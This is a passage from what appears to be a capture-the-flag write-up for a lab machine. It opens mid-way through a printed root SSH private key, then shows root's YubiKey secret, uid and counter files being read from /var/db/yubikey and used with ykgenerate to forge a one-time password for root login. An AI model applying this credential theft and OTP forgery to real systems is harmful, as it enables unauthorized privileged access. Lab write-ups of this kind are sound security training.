n9mlrJUn4u7MlVB5H71I2J1un9oR6ax1LzLVQRz71kMXEZ8b8h7s2l3rUjR0Tr2tDqRj2q
qZPSDrHrnu0GtfvzysQ+I/O3gncyKQAAAAMBAAEAAAGBAJ9RvXobW2cPcZQOd4SOeIwyjW
fFyYu2ql/KDzH81IrMaxTUrPEYGl25D5j72NkgZoLj4CSOFjOgU/BNxZ622jg1MdFPPjqV
MSGGtcLeUeXZbELoKj0c40wwOJ1wh0BRFK9IZkZ4kOCl7o/xD67iPV0FJsf2XsDrXtHfT5
kYpvLiTBX7Zx9okfEh7004g/DBp7KmJ0YW3cR2u77KmdTOprEwtrxJWc5ZyWfI2/rv+piV
InfLTLV0YHv3d2oo8TjUl4kSe2FSzhzFPvNh6RVWvvtZ96lEK3OvMpiC+QKRA2azc8QMqY
HyLF7Y65y6a9YwH+Z6GOtB+PjezsbjO/k+GbkvjClXT6FWYzIuV+DuT153D/HXxJKjxybh
iJHdkEyyQPvNH8wEyXXSsVPl/qZ+4OJ0mrrUif81SwxiHWP0CR7YCje9CzmsHzizadhvOZ
gtXsUUlooZSGboFRSdxElER3ztydWt2sLPDZVuFUAp6ZeMtmgo3q7HCpUsHNGtuWSO6QAA
AMEA6INodzwbSJ+6kitWyKhOVpX8XDbTd2PQjOnq6BS/vFI+fFhAbMH/6MVZdMrB6d7cRH
BwaBNcoH0pdem0K/Ti+f6fU5uu5OGOb+dcE2dCdJwMe5U/nt74guVOgHTGvKmVQpGhneZm
y2ppHWty+6QimFeeSoV6y58Je31QUU1d4Y1m+Uh/Q5ERC9Zs1jsMmuqcNnva2/jJ487vhm
chwoJ9VPaSxM5y7PJaA9NwwhML+1DwxJT799fTcfOpXYRAAKiiAAAAwQD5vSp5ztEPVvt1
cvxqg7LX7uLOX/1NL3aGEmZGevoOp3D1ZXbMorDljV2e73UxDJbhCdv7pbYSMwcwL4Rnhp
aTdLtEoTLMFJN/rHhyBdQ2j54uztoTVguYb1tC/uQZvptX/1DJRtqLVYe6hT6vIJuk/fi8
tktL/yvaCuG0vLdOO52RjK5Ysqu64G2w+bXnD5t1LrWJRBK2PmJf+406c6USo4rIdrwvSW
jYrMCCMoAzo75PnKiz5fw0ltXCGy5Y6PMAAADBAPhXwJlRY9yRLUhxg4GkVdGfEA5pDI1S
JxxCXG8yYYAmxI9iODO2xBFR1of1BkgfhyoF6/no8zIj1UdqlM3RDjUuWJYwWvSZGXewr+
OTehyqAgK88eFS44OHFUJBBLB33Q71hhvf8CjTMHN3T+x1jEzMvEtw8s0bCXRSj378fxhq
/K8k9yVXUuG8ivLI3ZTDD46thrjxnn9D47DqDLXxCR837fsifgjv5kQTGaHl0+MRa5GlRK
fg/OEuYUYu9LJ/cwAAABJyb290QGNyb3NzZml0Mi5odGIBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
```

Trying to use this key to ssh in fails however. Checking the verbose output we see the authentication had partial success, which means 2FA is enabled.

```
$ ssh -i root -v root@crossfit.htb
OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021
debug1: Reading configuration data /etc/ssh/ssh_config
...[snip]...
Authenticated with partial success.
debug1: Authentications that can continue: password
debug1: Next authentication method: password
root@crossfit.htb's password:
```

Looking for the 2FA method in the `/var` folder we find an interesting `yubikey` folder under `db`.

```
crossfit2$ ls /var/db/
acpi                       ldap                       rpki-client
dhclient.leases.vmx0       libc.tags                  xkb
host.random                locate.database            xmlcatalog
installed.SHA256           ns                         yubikey
kernel.SHA256              ntpd.drift
kvm_bsd.db                 pkg
```

With the default naming scheme for yubikey files we can retrieve all the files we need to generate our own OTP's.

```
crossfit2$ log /var/db/yubikey/root.key  

* LogReader v0.1

[*] Log size: 33

6bf9a26475388ce998988b67eaa2ea87
```

```
crossfit2$ log /var/db/yubikey/root.uid

* LogReader v0.1

[*] Log size: 13

a4ce1128bde4
```

```
crossfit2$ log /var/db/yubikey/root.ctr

* LogReader v0.1

[*] Log size: 6

985089
```

Installing yubikey on our local machine and following the [documentation](https://developers.yubico.com/yubico-c/Manuals/ykgenerate.1.html) we can generate our own key. The counter is too long according to the documentation, but only using the last 2 bytes works just fine to generate the OTP.

```
$ ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 5089 c0a8 00 10
dgvrelfegbnkthnfvenbejhiredtlhhf
```

Using the ssh key in combination with the OTP, we can now finally log into the machine as the root user and add the root flag to our collection.

```
$ ssh -i root root@crossfit.htb
root@crossfit.htb's password:
OpenBSD 6.8 (GENERIC.MP) #4: Mon Jan 11 10:35:56 MST 2021

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

crossfit2# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
crossfit2# wc -c /root/root.txt
      33 /root/root.txt
```
